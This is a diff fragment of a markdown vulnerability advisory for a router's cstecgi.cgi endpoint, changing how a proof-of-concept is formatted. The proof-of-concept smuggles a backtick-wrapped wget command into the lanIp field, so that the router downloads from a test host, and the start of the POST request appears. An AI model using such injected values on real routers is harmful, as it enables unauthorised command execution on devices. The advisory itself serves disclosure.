@@ -38,7 +38,7 @@ Finally,the command will be executed by  execv() in CsteSystem
 
 ## Proof of Concept (PoC)
 
-We set `lanIp` as **`wget 192.168.6.1:7777/testpoc`** , and the router will execute it,such as:
+We set `lanIp` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
 
 ```
 POST /cgi-bin/cstecgi.cgi HTTP/1.1
@@ -70,6 +70,7 @@ In Busybox terminal:
 In Ubuntu terminal：
 
 <div  align="center"><img src="./img/poc2.png" style="zoom:80%;" /></div>
+
 
 
 
